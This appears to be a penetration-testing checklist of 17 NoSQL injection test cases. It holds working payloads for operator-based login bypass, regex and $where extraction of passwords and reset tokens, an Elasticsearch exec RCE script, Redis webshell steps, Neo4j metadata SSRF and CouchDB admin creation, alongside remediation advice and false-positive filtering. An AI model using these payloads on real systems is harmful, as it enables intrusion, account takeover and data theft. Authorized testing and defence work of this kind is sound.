# NoSQL Injection — Checklist

Expert per-attack **test-case matrix** for NoSQL Injection — in testing order, impact-first. All columns preserved (where to inject, steps, expected, payload, impact, severity, CVSS, tools, refs).

*17 test cases · spreadsheet grid — scroll sideways for all 12 columns.*

| Operation | Test Case Name | Test Category | Where to Test / Injection Point | Test Steps | Expected Result | Payload Example | Impact | Severity | CVSS | Tools | References |
|---|---|---|---|---|---|---|---|---|---|---|---|
| NOSQL-001 | Fingerprint datastore, driver &amp; body-parser behavior | Recon &amp; Fingerprint | Login, search, filter, id, sort, aggregation, JSON bodies | 1. Identify the datastore (MongoDB/CouchDB/Elasticsearch/Redis/Neo4j/DynamoDB/Firebase) and stack/driver (Node+Mongoose / PyMongo / PHP).<br>2. Determine body-parser behavior: does p[$ne]= become an object? Is JSON accepted?<br>3. Map ALL query-reaching inputs (login, search, filter, id, sort, aggregation, JSON bodies). | The datastore, driver, parser behavior, and injectable inputs are known. | <code>p[$ne]=x becomes {p:{$ne:'x'}} ; JSON body accepted ; Mongoose detected</code> | Whether brackets parse into operators decides if NoSQLi is even reachable. | Info | 0.0 (N/A) | Burp Suite Pro, httpx | CWE-943; OWASP Testing Guide: Testing for NoSQL Injection (WSTG-INPV-05) |
| NOSQL-002 | Operator differential detection (TRUE vs FALSE control) | Detection | Any query-reaching parameter | 1. Send a TRUE-forcing operator: param[$ne]=nonexistent / [$regex]=.&#42; / [$gt]= (expect more/all/login-ok).<br>2. Send the FALSE control: param[$gt]=zzzz / [$regex]=^$ (expect none).<br>3. A response DIFF between TRUE and FALSE = injectable operator. Try BOTH JSON body and bracket/form forms. | TRUE and FALSE operator payloads produce a stable, repeatable response difference. | <code>param[$ne]=x  vs  param[$regex]=^$  ;  {"param":{"$gt":""}}</code> | Confirms the query interprets attacker operators - the core NoSQLi primitive. | Info | 0.0 (N/A) | Burp Repeater/Intruder, poc/nosqli_fuzz.py | CWE-943; PortSwigger Web Security Academy: NoSQL injection |
| NOSQL-003 | Time-based blind detection ($where sleep) | Detection | Inputs reaching a $where JS predicate | 1. Inject a bounded delay: {"$where":"sleep(3000)"} (&lt;=5s).<br>2. Confirm a REPEATABLE delay vs a no-payload baseline.<br>3. Boolean-via-time: {"$where":"this.user=='admin' &amp;&amp; sleep(3000)"}. | The response is reliably delayed only when the $where payload is present. | <code>{"$where":"sleep(3000)"} ; {"$where":"this.user=='admin' &amp;&amp; sleep(3000)"}</code> | Proves server-side JS execution / a blind oracle even with no reflected output. | Info | 0.0 (N/A) | Burp Repeater | CWE-943; HackTricks: NoSQL injection |
| NOSQL-004 | Authentication bypass via operators (JSON) | Auth Bypass | Login endpoints accepting JSON | 1. Send {"username":{"$ne":null},"password":{"$ne":null}} - matches any user.<br>2. Target admin: {"username":"admin","password":{"$ne":"x"}} or {"password":{"$regex":"^"}}.<br>3. $in list: {"username":{"$in":["admin","root"]},"password":{"$ne":1}}.<br>4. CONFIRM: logged in with NO valid password, fresh session, as the expected/admin user. | You are authenticated without a valid password, as the intended/admin user. | <code>{"username":{"$ne":null},"password":{"$ne":null}} ; {"username":"admin","password":{"$ne":"x"}}</code> | Full authentication bypass / admin login - Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Repeater | CWE-943; CWE-287; PortSwigger Web Security Academy: NoSQL injection |
| NOSQL-005 | Authentication bypass via operators (form/bracket) | Auth Bypass | Login endpoints accepting urlencoded/form bodies | 1. username[$ne]=x&amp;password[$ne]=x.<br>2. username=admin&amp;password[$ne]=x ; username[$regex]=.&#42;&amp;password[$regex]=.&#42;.<br>3. Confirm the same no-password login as above. | Bracket-operator form data authenticates you without a password. | <code>username[$ne]=x&amp;password[$ne]=x ; username=admin&amp;password[$regex]=^</code> | Auth bypass via the form-encoded operator form - Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Repeater | CWE-943; CWE-287; PayloadsAllTheThings/NoSQL Injection |
| NOSQL-006 | $where string-concatenation login bypass | Auth Bypass | Logins that build a $where JS string from input | 1. Break out of the JS string: username=admin'&#124;&#124;'1'=='1 ; admin'&#124;&#124;1==1//.<br>2. password=' &#124;&#124; true &#124;&#124; '.<br>3. Confirm login as admin. | The injected JS boolean forces the $where predicate true and logs you in. | <code>admin'&#124;&#124;'1'=='1 ; admin'&#124;&#124;1==1// ; ' &#124;&#124; true &#124;&#124; '</code> | Auth bypass via $where string injection - Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Repeater | CWE-943; CWE-287; HackTricks: NoSQL injection |
| NOSQL-007 | Filter/query data disclosure | Data Disclosure | Search/filter/id/sort parameters | 1. [$ne]/$regex=.&#42; on a filter param to reveal other users'/unpublished data - but diff against a FALSE control (an endpoint that returns all by default is not a finding).<br>2. _id/lookup type confusion.<br>3. Confirm you see data you should not. | The filter operator returns records outside your authorized scope (vs the false control). | <code>status[$ne]=deleted ; owner[$regex]=.&#42; ; _id[$gt]=</code> | Cross-user / unpublished data disclosure - High. | High | 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) | Burp Repeater | CWE-943; PortSwigger Web Security Academy: NoSQL injection |
| NOSQL-008 | Aggregation abuse ($lookup / $out / $merge) | Data Disclosure / Write | Endpoints exposing an aggregation pipeline | 1. $lookup to read across collections: {"$lookup":{"from":"users",...}}.<br>2. $out/$merge WRITE a new collection (integrity) - avoid on prod.<br>3. $function (MongoDB 4.4+) for JS execution. | The pipeline reads another collection or writes data you control. | <code>{"pipeline":[{"$lookup":{"from":"users","localField":"x","foreignField":"y","as":"z"}}]}</code> | Cross-collection read / arbitrary write via aggregation - High/Critical. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Repeater | CWE-943; HackTricks: NoSQL injection |
| NOSQL-009 | Blind extraction via $regex (char-by-char) -&gt; ATO | Blind Extraction | A boolean oracle (login-ok / result-count / status / length) | 1. Establish the oracle, then extract char by char: password[$regex]=^a, ^ab, ^abc.<br>2. Discover length with ^.{N}$.<br>3. Extract a SECRET from your OWN account (hash/token) or a password-RESET token -&gt; account takeover. Escape regex metachars in the known prefix. | The regex oracle reveals a secret character by character. | <code>{"username":"admin","password":{"$regex":"^abc"}} ; {"...":{"$regex":"^.{32}$"}}</code> | Blind extraction of reset tokens/hashes -&gt; account takeover - High/Critical. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N) | poc/nosqli_blind.py, Burp Intruder | CWE-943; PortSwigger Web Security Academy: NoSQL injection |
| NOSQL-010 | Blind extraction via $where JS (regex filtered) | Blind Extraction | $where reachable when $regex is filtered | 1. {"$where":"this.password[0]=='a'"} ; charCodeAt binary search.<br>2. {"$where":"this.password.match(/^a/)!=null"}.<br>3. Field discovery: {"$where":"Object.keys(this)"}. Bounded sleeps only. | The $where JS oracle extracts secret bytes / discovers fields. | <code>{"$where":"this.password.charCodeAt(0)&gt;96"} ; {"$where":"Object.keys(this)"}</code> | Blind data extraction via server-side JS - High/Critical. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N) | poc/nosqli_blind.py | CWE-943; HackTricks: NoSQL injection |
| NOSQL-011 | Server-side JS execution ($where / $function / mapReduce) | Server-Side JS | MongoDB with JS enabled | 1. Confirm JS runs: $where predicate, $function (4.4+), mapReduce.<br>2. {"$function":{"body":"function(){return true}","args":[],"lang":"js"}}.<br>3. This is a strong DoS/logic primitive; bounded only on prod. | Server-side JavaScript you supply executes inside the query engine. | <code>{"$function":{"body":"function(){return true}","args":[],"lang":"js"}}</code> | Server-side JS execution -&gt; blind exfil / logic bypass / DoS - High. | High | 8.6 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L) | Burp Repeater, mongosh | CWE-943; HackTricks: NoSQL injection |
| NOSQL-012 | Elasticsearch scripting RCE / dump | Per-Datastore — Elasticsearch | Elasticsearch query/script endpoints | 1. Search injection: GET /_search?q=&#42; ; _all dump.<br>2. Scripting RCE: {"script_fields":{"x":{"script":"java.lang.Runtime.getRuntime().exec('id')"}}} (CVE-2014-3120/2015-1427 class). Benign command only. | The script field executes a benign command / the index is dumped. | <code>POST /_search {"script_fields":{"x":{"script":"...exec('id')"}}}</code> | RCE / full-index disclosure via Elasticsearch - Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Repeater | CWE-943; CWE-94; Elasticsearch CVE-2015-1427; HackTricks: NoSQL injection |
| NOSQL-013 | Redis / Neo4j / CouchDB / Firebase datastore attacks | Per-Datastore | Redis (via SSRF/CRLF), Neo4j Cypher, CouchDB, Firebase REST | 1. Redis via SSRF/CRLF: CONFIG SET dir/dbfilename + SET webshell + SAVE ; EVAL Lua ; MODULE LOAD.<br>2. Neo4j: LOAD CSV FROM 'http://169.254.169.254/...' (SSRF); CALL apoc.load.json.<br>3. CouchDB CVE-2017-12635 admin creation (duplicate-key roles). Firebase: unauth read/write on open rules (/users.json). | The datastore-specific injection yields webshell / SSRF / admin / unauth data. | <code>PUT /_users/org.couchdb.user:hacker {roles:['_admin'],roles:[]} ; GET TARGET.firebaseio.com/users.json</code> | RCE / SSRF-&gt;metadata / privilege escalation / unauth data - Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Repeater, SSRFmap | CWE-943; CouchDB CVE-2017-12635; HackTricks: NoSQL injection |
| NOSQL-014 | DynamoDB PartiQL injection | Per-Datastore - DynamoDB | Apps using DynamoDB PartiQL (ExecuteStatement) with string-built statements | 1. PartiQL is SQL-like, so classic STRING injection applies (unlike the operator/JS families): break the quote in a WHERE clause.<br>2. Auth/filter bypass: ' OR '1'='1 -&gt; OR-true to widen results / bypass an owner filter; PartiQL supports INSERT/UPDATE/DELETE so a write statement can be injected too (integrity).<br>3. PartiQL has NO comment syntax -&gt; quote-balance the payload; confirm records outside your scope return (diff vs a FALSE control). | A PartiQL quote-breakout returns records outside the intended scope (or steers a write). | <code>partiQL param = a' OR '1'='1  ;  " OR "1"="1</code> | Auth/filter bypass + cross-item disclosure via PartiQL string injection (write-statement injection climbs to Critical) - High. | High | 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) | Burp Repeater, aws cli | CWE-943; CWE-89; HackTricks: NoSQL injection |
| NOSQL-015 | WAF / sanitizer bypass | Evade — WAF/Sanitizer | express-mongo-sanitize / $-stripping sanitizers | 1. Nest deeper past key-stripping: {"username":{"$not":{"$eq":null}}}.<br>2. Content-type switch (JSON &lt;-&gt; form username[$ne]= &lt;-&gt; multipart).<br>3. HPP (username=admin&amp;username[$ne]=x), type juggling (password=0), array injection (username[]=admin), second-order (stored operator used later). | The operator survives the sanitizer via nesting/encoding/type tricks. | <code>{"username":{"$not":{"$eq":null}}} ; username=admin&amp;username[$ne]=x ; username[]=admin</code> | Restores NoSQLi against sanitizers - proves partial fixes incomplete. Bypass. | Info | 0.0 (N/A) | Burp Repeater | CWE-943; HackTricks: NoSQL injection |
| NOSQL-016 | False-positive filter / auto-reject | Validation &amp; Reporting | Before reporting any candidate | 1. REJECT: a lone 500/error from [$ne] or { (no steered behavior change); $regex=.&#42; returning all when the endpoint returns all by default (no diff vs false control); a single non-repeatable timing blip; a reflected operator in a JSON echo (no query effect); 'it's MongoDB' with no injecting parameter.<br>2. REQUIRE: a steered, repeatable change (login without password / data out / secret extracted / JS executed). | Only candidates with a steered, repeatable, control-baselined change survive. | <code>lone 500 = not a finding ; $regex=.&#42; = only if it diffs the false control ; reflected operator = no query effect</code> | Protects credibility; NoSQLi is dense with 'a 500 from a brace' false positives. | Info | 0.0 (N/A) | manual | CWE-943; PortSwigger Web Security Academy: NoSQL injection |
| NOSQL-017 | Client-facing impact &amp; SAFE-PoC package | Validation &amp; Reporting | Confirmed finding, pre-submission | 1. Lead with impact: auth bypass / data exfil / secret-&gt;ATO / RCE.<br>2. Provide the payload, the TRUE-vs-FALSE control responses, and the concrete proof (logged-in session / extracted secret / benign command output).<br>3. Set CVSS 3.1 + CWE-943. Remediation: cast inputs to strings/expected types, reject objects where scalars are expected, use parameterized queries, disable $where/server-side JS, least-privilege DB user, validate content-type.<br>4. Own test account as victim, bounded sleeps, stop extraction once proven, delete throwaway writes; de-dupe. | A reproducible, correctly-rated, safe PoC with clear remediation. | <code>PoC: payload + true/false control diff + concrete impact proof + CVSS + CWE-943 + remediation.</code> | Converts the steered change into a defensible Critical/High report at the right severity. | Info | 0.0 (N/A) | CVSS calculator, NOSQLI_REPORT_TEMPLATE.md | CWE-943; FIRST CVSS v3.1; OWASP Testing Guide: Testing for NoSQL Injection (WSTG-INPV-05)  &#124;  TOP REFERENCES: PortSwigger Academy; PayloadsAllTheThings; HackTricks; OWASP; Charlie Belmer nosqli research |
